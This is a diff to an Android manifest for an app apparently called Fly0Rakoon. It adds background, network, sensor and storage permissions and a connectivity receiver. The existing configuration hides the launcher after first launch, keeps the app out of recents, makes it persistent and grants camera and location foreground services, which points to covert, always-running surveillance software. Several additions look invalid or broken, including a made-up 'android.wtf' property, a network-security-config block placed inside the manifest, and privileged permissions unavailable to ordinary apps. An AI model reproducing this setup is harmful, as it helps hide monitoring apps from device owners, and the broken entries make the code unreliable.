@@ -13,12 +13,13 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" /> <!-- ✅ ADDED HERE -->
     <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
     
-    <!-- 🌐 NETWORK & WIFI PERMISSIONS - REMOVED DUPLICATE -->
+    <!-- 🌐 NETWORK & WIFI PERMISSIONS -->
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
     <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
     
     <!-- 📷 CAMERA PERMISSIONS -->
     <uses-permission android:name="android.permission.CAMERA" />
@@ -55,6 +56,8 @@
     <uses-permission android:name="android.permission.RESTART_PACKAGES" />
     <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.REQUEST_COMPANION_RUN_IN_BACKGROUND" />
+    <uses-permission android:name="android.permission.REQUEST_COMPANION_USE_DATA_IN_BACKGROUND" />
     
     <!-- 📱 ADDITIONAL DEVICE INFO PERMISSIONS -->
     <uses-permission android:name="android.permission.BLUETOOTH" />
@@ -96,6 +99,11 @@
     <!-- 🕒 ALARM PERMISSIONS -->
     <uses-permission android:name="android.permission.SET_ALARM" />
     
+    <!-- 📡 ADDITIONAL NETWORK PERMISSIONS -->
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_CONDITIONS" />
+    <uses-permission android:name="android.permission.HIGH_SAMPLING_RATE_SENSORS" />
+    <uses-permission android:name="android.permission.DEVICE_IDLE_WHITELIST" />
+    
     <application
         android:name=".AppController"
         android:allowBackup="true"
@@ -107,7 +115,23 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.Fly0Rakoon"
         android:usesCleartextTraffic="true"
-        android:persistent="true">
+        android:persistent="true"
+        android:requestLegacyExternalStorage="true">
+        
+        <!-- ✅ ANDROID 12+ FOREGROUND SERVICE BEHAVIOR - ADDED HERE -->
+        <property
+            android:name="android.wtf.PROPERTY_LAUNCHER_TASK"
+            android:value="true" />
+        
+        <!-- Network security config -->
+        <network-security-config
+            xmlns:android="http://schemas.android.com/apk/res/android">
+            <base-config cleartextTrafficPermitted="true" />
+            <domain-config cleartextTrafficPermitted="true">
+                <domain includeSubdomains="true">localhost</domain>
+                <domain includeSubdomains="true">127.0.0.1</domain>
+            </domain-config>
+        </network-security-config>
         
         <!-- Main Activity (Launcher) - Hidden after launch -->
         <activity
@@ -115,7 +139,9 @@
             android:exported="true"
             android:excludeFromRecents="true"
             android:launchMode="singleInstance"
-            android:noHistory="true">
+            android:noHistory="true"
+            android:configChanges="orientation|keyboardHidden|screenSize"
+            android:keepScreenOn="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
@@ -189,6 +215,17 @@
             <intent-filter>
                 <action android:name="CHECK_SERVICE" />
                 <action android:name="ALARM_RESTART" />
+            </intent-filter>
+        </receiver>
+        
+        <!-- Network callback receiver for connectivity changes -->
+        <receiver
+            android:name=".NetworkChangeReceiver"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED" />
             </intent-filter>
         </receiver>
         
